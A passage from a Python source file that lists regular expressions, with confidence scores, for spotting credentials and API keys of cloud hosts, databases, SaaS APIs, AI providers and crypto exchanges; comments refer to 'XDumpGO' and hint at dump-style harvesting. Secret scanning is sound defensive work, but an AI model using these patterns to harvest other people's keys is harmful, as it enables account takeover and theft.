         re.compile(r'https://[a-z0-9]+\.blob\.core\.windows\.net/[a-z0-9-]+', re.I), 0.85),
        ("Azure SAS Token", "cloud", "azure_sas",
         re.compile(r'\?sv=\d{4}-\d{2}-\d{2}&[^\s"\'<>]+sig=[A-Za-z0-9%+/=]+', re.I), 0.90),
        ("Azure Client ID", "cloud", "azure_client",
         re.compile(r'azure[._-]?client[._-]?id["\s:=]+["\']?([a-f0-9-]{36})["\']?', re.I), 0.85),
        ("Azure Tenant ID", "cloud", "azure_tenant",
         re.compile(r'azure[._-]?tenant[._-]?id["\s:=]+["\']?([a-f0-9-]{36})["\']?', re.I), 0.85),
        
        # ------------ DigitalOcean ------------
        ("DigitalOcean Token", "cloud", "do_token",
         re.compile(r'(?:do[._-]?(?:api[._-]?)?token|digitalocean[._-]?token)["\s:=]+["\']?([a-f0-9]{64})["\']?', re.I), 0.85),
        ("DigitalOcean Spaces Key", "cloud", "do_spaces",
         re.compile(r'(?:spaces[._-]?)?(?:access[._-]?)?key[._-]?id["\s:=]+["\']?([A-Z0-9]{20})["\']?', re.I), 0.75),
        
        # ------------ Heroku ------------
        ("Heroku API Key", "cloud", "heroku_key",
         re.compile(r'(?:heroku[._-]?)?api[._-]?key["\s:=]+["\']?([a-f0-9-]{36})["\']?', re.I), 0.85),
        ("Heroku App", "cloud", "heroku_app",
         re.compile(r'https://[a-z0-9-]+\.herokuapp\.com', re.I), 0.70),
        
        # ------------ Vercel ------------
        ("Vercel Token", "cloud", "vercel_token",
         re.compile(r'vercel[._-]?(?:api[._-]?)?token["\s:=]+["\']?([A-Za-z0-9]{24,})["\']?', re.I), 0.80),
        ("Vercel Deploy Hook", "cloud", "vercel_hook",
         re.compile(r'https://api\.vercel\.com/v1/integrations/deploy/[A-Za-z0-9]+/[A-Za-z0-9]+', re.I), 0.85),
        
        # ------------ Netlify ------------
        ("Netlify Token", "cloud", "netlify_token",
         re.compile(r'netlify[._-]?(?:auth[._-]?)?token["\s:=]+["\']?([A-Za-z0-9_-]{40,})["\']?', re.I), 0.80),
        ("Netlify Build Hook", "cloud", "netlify_hook",
         re.compile(r'https://api\.netlify\.com/build_hooks/[A-Za-z0-9]+', re.I), 0.85),
        
        # ------------ Supabase ------------
        ("Supabase URL", "cloud", "supabase_url",
         re.compile(r'https://[a-z0-9]+\.supabase\.co', re.I), 0.85),
        ("Supabase Anon Key", "cloud", "supabase_anon",
         re.compile(r'(?:supabase[._-]?)?(?:anon[._-]?)?key["\s:=]+["\']?(eyJ[A-Za-z0-9_-]{50,500})["\']?', re.I), 0.85),
        ("Supabase Service Key", "cloud", "supabase_service",
         re.compile(r'(?:supabase[._-]?)?(?:service[._-]?(?:role[._-]?)?)?key["\s:=]+["\']?(eyJ[A-Za-z0-9_-]{50,500})["\']?', re.I), 0.90),
        
        # ------------ PlanetScale ------------
        ("PlanetScale Connection", "cloud", "planetscale_conn",
         re.compile(r'mysql://[^:]+:[^@]+@[^/]+\.psdb\.cloud', re.I), 0.90),
        ("PlanetScale Token", "cloud", "planetscale_token",
         re.compile(r'pscale_tkn_[A-Za-z0-9_-]{40,}', re.I), 0.95),
        
        # ------------ Railway ------------
        ("Railway Token", "cloud", "railway_token",
         re.compile(r'railway[._-]?(?:api[._-]?)?token["\s:=]+["\']?([A-Za-z0-9_-]{36,})["\']?', re.I), 0.80),
        
        # ------------ Render ------------
        ("Render API Key", "cloud", "render_key",
         re.compile(r'rnd_[A-Za-z0-9]{32,}', re.I), 0.90),
        
        # ------------ Fly.io ------------
        ("Fly.io Token", "cloud", "flyio_token",
         re.compile(r'fly[._-]?(?:api[._-]?)?token["\s:=]+["\']?([A-Za-z0-9_-]{40,})["\']?', re.I), 0.80),
        
        # ------------ Cloudinary ------------
        ("Cloudinary URL", "cloud", "cloudinary_url",
         re.compile(r'cloudinary://[^:]+:[^@]+@[a-z0-9-]+', re.I), 0.90),
        ("Cloudinary API Key", "cloud", "cloudinary_key",
         re.compile(r'(?:cloudinary[._-]?)?api[._-]?key["\s:=]+["\']?(\d{15})["\']?', re.I), 0.85),
        ("Cloudinary Secret", "cloud", "cloudinary_secret",
         re.compile(r'(?:cloudinary[._-]?)?api[._-]?secret["\s:=]+["\']?([A-Za-z0-9_-]{20,})["\']?', re.I), 0.90),
        
        # ------------ Imgix ------------
        ("Imgix API Key", "cloud", "imgix_key",
         re.compile(r'imgix[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{32,})["\']?', re.I), 0.85),
        
        # ------------ Uploadcare ------------
        ("Uploadcare Public Key", "cloud", "uploadcare_public",
         re.compile(r'uploadcare[._-]?(?:public[._-]?)?key["\s:=]+["\']?([a-f0-9]{20})["\']?', re.I), 0.80),
        ("Uploadcare Secret Key", "cloud", "uploadcare_secret",
         re.compile(r'uploadcare[._-]?(?:secret[._-]?)?key["\s:=]+["\']?([a-f0-9]{40})["\']?', re.I), 0.90),
        
        # ------------ Backblaze B2 ------------
        ("Backblaze Key ID", "cloud", "backblaze_key",
         re.compile(r'(?:b2|backblaze)[._-]?(?:application[._-]?)?key[._-]?id["\s:=]+["\']?([a-f0-9]{12,25})["\']?', re.I), 0.80),
        ("Backblaze App Key", "cloud", "backblaze_app",
         re.compile(r'(?:b2|backblaze)[._-]?(?:application[._-]?)?key["\s:=]+["\']?([A-Za-z0-9+/]{31}=?)["\']?', re.I), 0.85),
        
        # ------------ Wasabi ------------
        ("Wasabi Access Key", "cloud", "wasabi_key",
         re.compile(r'(?:wasabi[._-]?)?access[._-]?key["\s:=]+["\']?([A-Z0-9]{20})["\']?', re.I), 0.80),
        
        # ------------ Linode ------------
        ("Linode Token", "cloud", "linode_token",
         re.compile(r'(?:linode[._-]?)?(?:api[._-]?)?token["\s:=]+["\']?([a-f0-9]{64})["\']?', re.I), 0.85),
        
        # ------------ Vultr ------------
        ("Vultr API Key", "cloud", "vultr_key",
         re.compile(r'(?:vultr[._-]?)?api[._-]?key["\s:=]+["\']?([A-Z0-9]{36})["\']?', re.I), 0.85),
        
        # =====================================================================
        # =============== DATABASE CREDENTIALS (Extended) ====================
        # =====================================================================
        
        ("MySQL Connection", "database", "mysql_conn",
         re.compile(r'mysql://[^:]+:[^@]+@[^/]+(?:/[^\s"\'<>]+)?', re.I), 0.90),
        ("PostgreSQL Connection", "database", "pg_conn",
         re.compile(r'(?:postgres(?:ql)?|psql)://[^:]+:[^@]+@[^/]+(?:/[^\s"\'<>]+)?', re.I), 0.90),
        ("MongoDB Connection", "database", "mongo_conn",
         re.compile(r'mongodb(?:\+srv)?://[^:]+:[^@]+@[^/]+(?:/[^\s"\'<>]+)?', re.I), 0.90),
        ("Redis Connection", "database", "redis_conn",
         re.compile(r'redis(?:s)?://(?:[^:]+:[^@]+@)?[^/]+(?:/\d+)?', re.I), 0.85),
        ("JDBC Connection", "database", "jdbc_conn",
         re.compile(r'jdbc:[a-z]+://[^:]+(?::\d+)?/\w+(?:\?[^\s"\'<>]+)?', re.I), 0.80),
        ("CockroachDB Connection", "database", "cockroach_conn",
         re.compile(r'postgresql://[^:]+:[^@]+@[^/]+\.cockroachlabs\.cloud', re.I), 0.90),
        ("Neon Database", "database", "neon_conn",
         re.compile(r'postgresql://[^:]+:[^@]+@[^/]+\.neon\.tech', re.I), 0.90),
        ("Turso/Libsql", "database", "turso_conn",
         re.compile(r'libsql://[^:]+@[^/]+\.turso\.io', re.I), 0.90),
        ("Upstash Redis", "database", "upstash_redis",
         re.compile(r'https://[^:]+@[a-z0-9-]+\.upstash\.io', re.I), 0.85),
        ("ElasticSearch URL", "database", "elastic_url",
         re.compile(r'https?://[^:]+:[^@]+@[a-z0-9.-]+(?:\.es\.io|\.elastic\.cloud|:9200)', re.I), 0.85),
        ("DB Password", "database", "db_password",
         re.compile(r'(?:DB[._-]?PASS(?:WORD)?|DATABASE[._-]?PASS(?:WORD)?)["\s:=]+["\']?([^\s"\'<>]{5,60})["\']?', re.I), 0.85),
        ("DB Host", "database", "db_host",
         re.compile(r'(?:DB[._-]?HOST|DATABASE[._-]?HOST)["\s:=]+["\']?([^\s"\'<>]{5,100})["\']?', re.I), 0.70),
        ("DB Username", "database", "db_user",
         re.compile(r'(?:DB[._-]?USER(?:NAME)?|DATABASE[._-]?USER(?:NAME)?)["\s:=]+["\']?([^\s"\'<>]{3,50})["\']?', re.I), 0.70),
        
        # =====================================================================
        # =============== API TOKENS & SERVICES (50+ APIs) ==================
        # =====================================================================
        
        # ------------ Authentication Tokens ------------
        ("Bearer Token", "api", "bearer",
         re.compile(r'[Bb]earer\s+([A-Za-z0-9._~+/=-]{20,500})', re.I), 0.80),
        ("JWT Token", "api", "jwt",
         re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}', re.I), 0.85),
        ("OAuth Access Token", "api", "oauth_token",
         re.compile(r'(?:access[._-]?token|oauth[._-]?token)["\s:=]+["\']?([A-Za-z0-9._~+/=-]{20,500})["\']?', re.I), 0.75),
        ("Refresh Token", "api", "refresh_token",
         re.compile(r'(?:refresh[._-]?token)["\s:=]+["\']?([A-Za-z0-9._~+/=-]{20,500})["\']?', re.I), 0.80),
        
        # ------------ GitHub ------------
        ("GitHub Token", "api", "github_token",
         re.compile(r'(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36,}', re.I), 0.95),
        ("GitHub OAuth", "api", "github_oauth",
         re.compile(r'(?:github[._-]?(?:oauth[._-]?)?(?:client[._-]?)?secret)["\s:=]+["\']?([A-Za-z0-9]{30,50})["\']?', re.I), 0.85),
        ("GitHub App Private Key", "api", "github_app_key",
         re.compile(r'-----BEGIN RSA PRIVATE KEY-----[\s\S]{100,2000}-----END RSA PRIVATE KEY-----', re.I), 0.95),
        
        # ------------ GitLab ------------
        ("GitLab Token", "api", "gitlab_token",
         re.compile(r'glpat-[A-Za-z0-9_-]{20,}', re.I), 0.95),
        ("GitLab CI Token", "api", "gitlab_ci",
         re.compile(r'(?:gitlab[._-]?)?ci[._-]?token["\s:=]+["\']?([A-Za-z0-9_-]{20,})["\']?', re.I), 0.80),
        
        # ------------ Bitbucket ------------
        ("Bitbucket App Password", "api", "bitbucket_pass",
         re.compile(r'(?:bitbucket[._-]?)?(?:app[._-]?)?password["\s:=]+["\']?([A-Za-z0-9]{20,})["\']?', re.I), 0.80),
        
        # ------------ Slack ------------
        ("Slack Token", "api", "slack_token",
         re.compile(r'xox[bpsa]-[A-Za-z0-9-]{10,250}', re.I), 0.95),
        ("Slack Webhook", "api", "slack_webhook",
         re.compile(r'hooks\.slack\.com/services/T[A-Za-z0-9]+/B[A-Za-z0-9]+/[A-Za-z0-9]+', re.I), 0.90),
        ("Slack App Token", "api", "slack_app",
         re.compile(r'xapp-[0-9]+-[A-Za-z0-9]+-[A-Za-z0-9]+', re.I), 0.90),
        
        # ------------ Discord ------------
        ("Discord Webhook", "api", "discord_webhook",
         re.compile(r'discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+', re.I), 0.90),
        ("Discord Bot Token", "api", "discord_bot",
         re.compile(r'[MN][A-Za-z0-9]{23,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,40}', re.I), 0.80),
        
        # ------------ Telegram ------------
        ("Telegram Bot Token", "api", "telegram_bot",
         re.compile(r'\d{8,10}:[A-Za-z0-9_-]{35}', re.I), 0.85),
        
        # ------------ Communication APIs ------------
        # Twilio SID: MUST start with uppercase AC (case-sensitive, no re.I)
        ("Twilio Account SID", "api", "twilio_sid",
         re.compile(r'AC[a-f0-9]{32}'), 0.90),
        ("Twilio Auth Token", "api", "twilio_token",
         re.compile(r'(?:twilio[._-]?(?:auth[._-]?)?token)["\s:=]+["\']?([a-f0-9]{32})["\']?', re.I), 0.85),
        ("Twilio API Key", "api", "twilio_api_key",
         re.compile(r'SK[a-f0-9]{32}', re.I), 0.90),
        ("Vonage/Nexmo API Key", "api", "vonage_key",
         re.compile(r'(?:nexmo|vonage)[._-]?(?:api[._-]?)?key["\s:=]+["\']?([a-f0-9]{8})["\']?', re.I), 0.85),
        ("Vonage/Nexmo Secret", "api", "vonage_secret",
         re.compile(r'(?:nexmo|vonage)[._-]?(?:api[._-]?)?secret["\s:=]+["\']?([A-Za-z0-9]{16})["\']?', re.I), 0.90),
        ("Plivo Auth ID", "api", "plivo_id",
         re.compile(r'(?:plivo[._-]?)?auth[._-]?id["\s:=]+["\']?([A-Z0-9]{20})["\']?', re.I), 0.85),
        ("MessageBird API Key", "api", "messagebird_key",
         re.compile(r'messagebird[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{25})["\']?', re.I), 0.85),
        # Bandwidth tokens: require bandwidth context (t- prefix alone matches CSS classes)
        ("Bandwidth API Token", "api", "bandwidth_token",
         re.compile(r'bandwidth[._-]?(?:api[._-]?)?token["\s:=]+["\']?(t-[a-zA-Z0-9]{15,})["\']?', re.I), 0.85),
        
        # ------------ Email APIs ------------
        ("SendGrid API Key", "api", "sendgrid_key",
         re.compile(r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}', re.I), 0.95),
        ("Mailgun API Key", "api", "mailgun_key",
         re.compile(r'key-[a-f0-9]{32}', re.I), 0.90),
        ("Mailchimp API Key", "api", "mailchimp_key",
         re.compile(r'[a-f0-9]{32}-us\d{1,2}', re.I), 0.90),
        ("Postmark Token", "api", "postmark_token",
         re.compile(r'(?:postmark[._-]?)?(?:server[._-]?)?token["\s:=]+["\']?([a-f0-9-]{36})["\']?', re.I), 0.85),
        ("SparkPost API Key", "api", "sparkpost_key",
         re.compile(r'(?:sparkpost[._-]?)?api[._-]?key["\s:=]+["\']?([a-f0-9]{40})["\']?', re.I), 0.85),
        ("Resend API Key", "api", "resend_key",
         re.compile(r're_[A-Za-z0-9]{20,}', re.I), 0.90),
        
        # ------------ E-commerce APIs ------------
        ("Shopify Access Token", "api", "shopify_token",
         re.compile(r'shpat_[a-f0-9]{32}', re.I), 0.95),
        ("Shopify API Key", "api", "shopify_api",
         re.compile(r'shpka_[a-f0-9]{32}', re.I), 0.90),
        ("Shopify Shared Secret", "api", "shopify_secret",
         re.compile(r'shpss_[a-f0-9]{32}', re.I), 0.95),
        ("WooCommerce Consumer Key", "api", "woo_consumer_key",
         re.compile(r'ck_[a-f0-9]{40}', re.I), 0.90),
        ("WooCommerce Consumer Secret", "api", "woo_consumer_secret",
         re.compile(r'cs_[a-f0-9]{40}', re.I), 0.95),
        
        # ------------ Social Media APIs ------------
        ("Facebook Token", "api", "facebook_token",
         re.compile(r'(?:facebook[._-]?(?:access[._-]?)?token|fb[._-]?token)["\s:=]+["\']?([A-Za-z0-9|]{50,300})["\']?', re.I), 0.80),
        ("Facebook App Secret", "api", "facebook_secret",
         re.compile(r'(?:facebook|fb)[._-]?(?:app[._-]?)?secret["\s:=]+["\']?([a-f0-9]{32})["\']?', re.I), 0.90),
        ("Instagram Token", "api", "instagram_token",
         re.compile(r'instagram[._-]?(?:access[._-]?)?token["\s:=]+["\']?([A-Za-z0-9._]{50,300})["\']?', re.I), 0.75),
        ("Twitter API Key", "api", "twitter_key",
         re.compile(r'(?:twitter|tw)[._-]?(?:api[._-]?)?(?:key|consumer[._-]?key)["\s:=]+["\']?([A-Za-z0-9]{20,40})["\']?', re.I), 0.80),
        ("Twitter Bearer Token", "api", "twitter_bearer",
         re.compile(r'(?:twitter[._-]?)?bearer[._-]?token["\s:=]+["\']?([A-Za-z0-9%]{100,200})["\']?', re.I), 0.85),
        ("LinkedIn Client Secret", "api", "linkedin_secret",
         re.compile(r'(?:linkedin[._-]?)?client[._-]?secret["\s:=]+["\']?([A-Za-z0-9]{16})["\']?', re.I), 0.85),
        ("TikTok Access Token", "api", "tiktok_token",
         re.compile(r'tiktok[._-]?(?:access[._-]?)?token["\s:=]+["\']?([a-zA-Z0-9_.-]{50,200})["\']?', re.I), 0.75),
        ("Pinterest Token", "api", "pinterest_token",
         re.compile(r'pinterest[._-]?(?:access[._-]?)?token["\s:=]+["\']?([A-Za-z0-9_-]{36,})["\']?', re.I), 0.75),
        
        # ------------ AI/ML APIs (XDumpGO-style!) ------------
        ("OpenAI API Key", "api", "openai_key",
         re.compile(r'sk-[A-Za-z0-9]{20,}T3BlbkFJ[A-Za-z0-9]{20,}', re.I), 0.99),
        ("OpenAI API Key (New)", "api", "openai_key_new",
         re.compile(r'sk-proj-[A-Za-z0-9_-]{40,}', re.I), 0.99),
        ("OpenAI Org ID", "api", "openai_org",
         re.compile(r'org-[A-Za-z0-9]{24}', re.I), 0.90),
        ("Anthropic API Key", "api", "anthropic_key",
         re.compile(r'sk-ant-[A-Za-z0-9_-]{40,}', re.I), 0.99),
        ("Cohere API Key", "api", "cohere_key",
         re.compile(r'(?:cohere[._-]?)?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{40})["\']?', re.I), 0.85),
        ("HuggingFace Token", "api", "huggingface_token",
         re.compile(r'hf_[A-Za-z0-9]{34,}', re.I), 0.95),
        ("Replicate API Token", "api", "replicate_token",
         re.compile(r'r8_[A-Za-z0-9]{37}', re.I), 0.95),
        ("Google Palm/Gemini Key", "api", "google_ai_key",
         re.compile(r'(?:palm|gemini|google[._-]?ai)[._-]?(?:api[._-]?)?key["\s:=]+["\']?(AIza[A-Za-z0-9_-]{35})["\']?', re.I), 0.90),
        ("Stability AI Key", "api", "stability_key",
         re.compile(r'sk-[A-Za-z0-9]{48}', re.I), 0.85),
        ("Midjourney Token", "api", "midjourney_token",
         re.compile(r'(?:midjourney[._-]?)?(?:api[._-]?)?token["\s:=]+["\']?([A-Za-z0-9_-]{50,})["\']?', re.I), 0.75),
        
        # ------------ Vector DB APIs ------------
        ("Pinecone API Key", "api", "pinecone_key",
         re.compile(r'pinecone[._-]?(?:api[._-]?)?key["\s:=]+["\']?([a-f0-9-]{36})["\']?', re.I), 0.85),
        ("Weaviate API Key", "api", "weaviate_key",
         re.compile(r'weaviate[._-](?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{20,})["\']?', re.I), 0.80),
        ("Qdrant API Key", "api", "qdrant_key",
         re.compile(r'qdrant[._-](?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9_-]{20,})["\']?', re.I), 0.80),
        ("Milvus Token", "api", "milvus_token",
         re.compile(r'milvus[._-](?:api[._-]?)?(?:token|key)["\s:=]+["\']?([A-Za-z0-9_-]{20,})["\']?', re.I), 0.75),
        
        # ------------ Search APIs ------------
        ("Algolia API Key", "api", "algolia_key",
         re.compile(r'algolia[._-]?(?:api[._-]?)?key["\s:=]+["\']?([a-f0-9]{32})["\']?', re.I), 0.85),
        ("Algolia App ID", "api", "algolia_app",
         re.compile(r'algolia[._-]?(?:app(?:lication)?[._-]?)?id["\s:=]+["\']?([A-Z0-9]{10})["\']?'), 0.80),
        ("Elasticsearch API Key", "api", "elastic_key",
         re.compile(r'elastic[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9_-]{40,})["\']?', re.I), 0.85),
        ("Meilisearch API Key", "api", "meilisearch_key",
         re.compile(r'(?:meilisearch|meili)[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9_-]{20,})["\']?', re.I), 0.85),
        ("Typesense API Key", "api", "typesense_key",
         re.compile(r'typesense[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{20,})["\']?', re.I), 0.85),
        
        # ------------ Realtime/Websocket APIs ------------
        ("Pusher Key", "api", "pusher_key",
         re.compile(r'pusher[._-]?(?:app[._-]?)?key["\s:=]+["\']?([a-f0-9]{20})["\']?', re.I), 0.85),
        ("Pusher Secret", "api", "pusher_secret",
         re.compile(r'pusher[._-]?(?:app[._-]?)?secret["\s:=]+["\']?([a-f0-9]{20})["\']?', re.I), 0.90),
        ("Ably API Key", "api", "ably_key",
         re.compile(r'(?:ably[._-]?)?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9._-]{20,}:[A-Za-z0-9_-]{20,})["\']?', re.I), 0.90),
        ("PubNub Keys", "api", "pubnub_keys",
         re.compile(r'pubnub[._-]?(?:publish|subscribe)[._-]?key["\s:=]+["\']?([A-Za-z0-9_-]{36,})["\']?', re.I), 0.85),
        ("Stream API Key", "api", "stream_key",
         re.compile(r'(?:stream|getstream)[._-]?(?:api[._-]?)?key["\s:=]+["\']?([a-z0-9]{30,})["\']?', re.I), 0.80),
        ("Agora App ID", "api", "agora_app",
         re.compile(r'agora[._-]?(?:app[._-]?)?id["\s:=]+["\']?([a-f0-9]{32})["\']?', re.I), 0.85),
        
        # ------------ CI/CD APIs ------------
        ("CircleCI Token", "api", "circleci_token",
         re.compile(r'circleci[._-]?(?:api[._-]?)?token["\s:=]+["\']?([a-f0-9]{40})["\']?', re.I), 0.85),
        # Travis CI: MUST have travis prefix to avoid matching random "token=" values
        ("Travis CI Token", "api", "travis_token",
         re.compile(r'travis[._-]?(?:api[._-]?)?token["\s:=]+["\']?([A-Za-z0-9_-]{22})["\']?', re.I), 0.85),
        ("Jenkins Token", "api", "jenkins_token",
         re.compile(r'jenkins[._-]?(?:api[._-]?)?token["\s:=]+["\']?([a-f0-9]{32,})["\']?', re.I), 0.80),
        ("Buildkite Token", "api", "buildkite_token",
         re.compile(r'bkua_[A-Za-z0-9]{40}', re.I), 0.95),
        ("CodeClimate Token", "api", "codeclimate_token",
         re.compile(r'codeclimate[._-]?(?:api[._-]?)?token["\s:=]+["\']?([a-f0-9]{40})["\']?', re.I), 0.85),
        
        # ------------ Monitoring/Analytics APIs ------------
        ("Datadog API Key", "api", "datadog_key",
         re.compile(r'datadog[._-]?(?:api[._-]?)?key["\s:=]+["\']?([a-f0-9]{32})["\']?', re.I), 0.85),
        ("Datadog APP Key", "api", "datadog_app",
         re.compile(r'datadog[._-]?(?:app(?:lication)?[._-]?)?key["\s:=]+["\']?([a-f0-9]{40})["\']?', re.I), 0.85),
        ("New Relic API Key", "api", "newrelic_key",
         re.compile(r'NRAK-[A-Z0-9]{27}', re.I), 0.95),
        ("New Relic License Key", "api", "newrelic_license",
         re.compile(r'[a-f0-9]{40}NRAL', re.I), 0.95),
        ("Sentry DSN", "api", "sentry_dsn",
         re.compile(r'https://[a-f0-9]{32}@[a-z0-9.-]+\.ingest\.sentry\.io/\d+', re.I), 0.95),
        ("Bugsnag API Key", "api", "bugsnag_key",
         re.compile(r'bugsnag[._-]?(?:api[._-]?)?key["\s:=]+["\']?([a-f0-9]{32})["\']?', re.I), 0.85),
        ("LogRocket App ID", "api", "logrocket_app",
         re.compile(r'(?:logrocket[._-]?)?(?:app[._-]?)?id["\s:=]+["\']?([a-z0-9]{6}/[a-z0-9-]+)["\']?', re.I), 0.85),
        ("Rollbar Token", "api", "rollbar_token",
         re.compile(r'rollbar[._-]?(?:access[._-]?)?token["\s:=]+["\']?([a-f0-9]{32})["\']?', re.I), 0.85),
        ("Heap Analytics ID", "api", "heap_id",
         re.compile(r'heap(?:[._-]?(?:app|env|analytics))?[._-]?id["\s:=]+["\']?(\d{9,10})["\']?', re.I), 0.80),
        
        # ------------ Feature Flags ------------
        ("LaunchDarkly SDK Key", "api", "launchdarkly_key",
         re.compile(r'sdk-[a-f0-9-]{36}', re.I), 0.90),
        ("Split.io API Key", "api", "splitio_key",
         re.compile(r'(?:split[._-]?)?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{50,})["\']?', re.I), 0.80),
        ("Optimizely SDK Key", "api", "optimizely_key",
         re.compile(r'(?:optimizely[._-]?)?sdk[._-]?key["\s:=]+["\']?([A-Za-z0-9]{22})["\']?', re.I), 0.85),
        ("Flagsmith API Key", "api", "flagsmith_key",
         re.compile(r'(?:flagsmith[._-]?)?(?:environment[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{40,})["\']?', re.I), 0.80),
        
        # ------------ CRM/Support APIs ------------
        ("Intercom Access Token", "api", "intercom_token",
         re.compile(r'intercom[._-]?(?:access[._-]?)?token["\s:=]+["\']?([A-Za-z0-9=]{40,})["\']?', re.I), 0.85),
        ("Intercom App ID", "api", "intercom_app",
         re.compile(r'intercom[._-]?(?:app[._-]?)?id["\s:=]+["\']?([a-z0-9]{8,12})["\']?', re.I), 0.75),
        ("Zendesk Token", "api", "zendesk_token",
         re.compile(r'(?:zendesk[._-]?)?(?:api[._-]?)?token["\s:=]+["\']?([A-Za-z0-9]{40})["\']?', re.I), 0.85),
        ("Freshdesk API Key", "api", "freshdesk_key",
         re.compile(r'freshdesk[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{20})["\']?', re.I), 0.85),
        ("HubSpot API Key", "api", "hubspot_key",
         re.compile(r'(?:hubspot[._-]?)?(?:api[._-]?)?key["\s:=]+["\']?([a-f0-9-]{36})["\']?', re.I), 0.85),
        ("Salesforce Token", "api", "salesforce_token",
         re.compile(r'(?:salesforce[._-]?)?(?:access[._-]?)?token["\s:=]+["\']?([A-Za-z0-9!]{80,100})["\']?', re.I), 0.80),
        
        # ------------ Maps/Location APIs ------------
        ("Mapbox Token", "api", "mapbox_token",
         re.compile(r'pk\.[A-Za-z0-9]{60,}', re.I), 0.80),
        ("Mapbox Secret", "api", "mapbox_secret",
         re.compile(r'sk\.[A-Za-z0-9]{60,}', re.I), 0.90),
        ("Google Maps Key", "api", "google_maps_key",
         re.compile(r'AIza[0-9A-Za-z_-]{35}', re.I), 0.80),
        ("HERE API Key", "api", "here_key",
         re.compile(r'here[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9_-]{40,})["\']?', re.I), 0.80),
        ("TomTom API Key", "api", "tomtom_key",
         re.compile(r'tomtom[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{32})["\']?', re.I), 0.80),
        
        # ------------ Productivity APIs ------------
        # Airtable keys: key + 14 alphanumeric (must be in context like airtable, api_key, etc.)
        ("Airtable API Key", "api", "airtable_key",
         re.compile(r'(?:airtable|api[._-]?key|bearer)["\s:=]+["\']?(key[A-Za-z0-9]{14})["\']?', re.I), 0.85),
        ("Airtable Token", "api", "airtable_token",
         re.compile(r'pat[A-Za-z0-9]{14,}\.[a-f0-9]{64}', re.I), 0.95),
        ("Notion Token", "api", "notion_token",
         re.compile(r'secret_[A-Za-z0-9]{43}', re.I), 0.95),
        ("Notion Integration Token", "api", "notion_integration",
         re.compile(r'ntn_[A-Za-z0-9]{44,}', re.I), 0.95),
        ("Linear API Key", "api", "linear_key",
         re.compile(r'lin_api_[A-Za-z0-9]{40,}', re.I), 0.95),
        ("Asana Token", "api", "asana_token",
         re.compile(r'(?:asana[._-]?)?(?:access[._-]?)?token["\s:=]+["\']?([0-9]/[0-9]{16}:[A-Za-z0-9]{32})["\']?', re.I), 0.90),
        ("Monday.com API Token", "api", "monday_token",
         re.compile(r'eyJhbGciOiJIUzI1NiJ9\.[A-Za-z0-9_-]{50,}\.[A-Za-z0-9_-]{43}', re.I), 0.90),
        ("ClickUp API Token", "api", "clickup_token",
         re.compile(r'pk_[0-9]+_[A-Za-z0-9]{32}', re.I), 0.90),
        
        # =====================================================================
        # =============== CRYPTO/BLOCKCHAIN KEYS (XDumpGO!) =================
        # =====================================================================
        
        # ------------ Exchanges ------------
        ("Coinbase API Key", "crypto", "coinbase_key",
         re.compile(r'coinbase[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{16,})["\']?', re.I), 0.85),
        ("Coinbase API Secret", "crypto", "coinbase_secret",
         re.compile(r'coinbase[._-]?(?:api[._-]?)?secret["\s:=]+["\']?([A-Za-z0-9=+/]{44})["\']?', re.I), 0.90),
        ("Binance API Key", "crypto", "binance_key",
         re.compile(r'(?:binance[._-]?)?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{64})["\']?', re.I), 0.90),
        ("Binance API Secret", "crypto", "binance_secret",
         re.compile(r'(?:binance[._-]?)?(?:api[._-]?)?secret["\s:=]+["\']?([A-Za-z0-9]{64})["\']?', re.I), 0.95),
        ("Kraken API Key", "crypto", "kraken_key",
         re.compile(r'(?:kraken[._-]?)?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9+/]{56})["\']?', re.I), 0.85),
        ("Kucoin API Key", "crypto", "kucoin_key",
         re.compile(r'kucoin[._-]?(?:api[._-]?)?key["\s:=]+["\']?([a-f0-9]{24})["\']?', re.I), 0.85),
        ("Bitfinex API Key", "crypto", "bitfinex_key",
         re.compile(r'(?:bitfinex[._-]?)?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{43})["\']?', re.I), 0.85),
        ("Bybit API Key", "crypto", "bybit_key",
         re.compile(r'bybit[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9]{18,})["\']?', re.I), 0.85),
        
        # ------------ Blockchain Infrastructure ------------
        ("Infura Project ID", "crypto", "infura_project",
         re.compile(r'infura[._-]?(?:project[._-]?)?id["\s:=]+["\']?([a-f0-9]{32})["\']?', re.I), 0.85),
        ("Infura Project Secret", "crypto", "infura_secret",
         re.compile(r'infura[._-]?(?:project[._-]?)?secret["\s:=]+["\']?([a-f0-9]{32})["\']?', re.I), 0.90),
        ("Infura Endpoint", "crypto", "infura_endpoint",
         re.compile(r'https://(?:mainnet|goerli|sepolia)\.infura\.io/v3/[a-f0-9]{32}', re.I), 0.90),
        # Alchemy: MUST have alchemy prefix to avoid matching other API keys
        ("Alchemy API Key", "crypto", "alchemy_key",
         re.compile(r'alchemy[._-]?(?:api[._-]?)?key["\s:=]+["\']?([A-Za-z0-9_-]{32})["\']?', re.I), 0.90),
        ("Alchemy Endpoint", "crypto", "alchemy_endpoint",
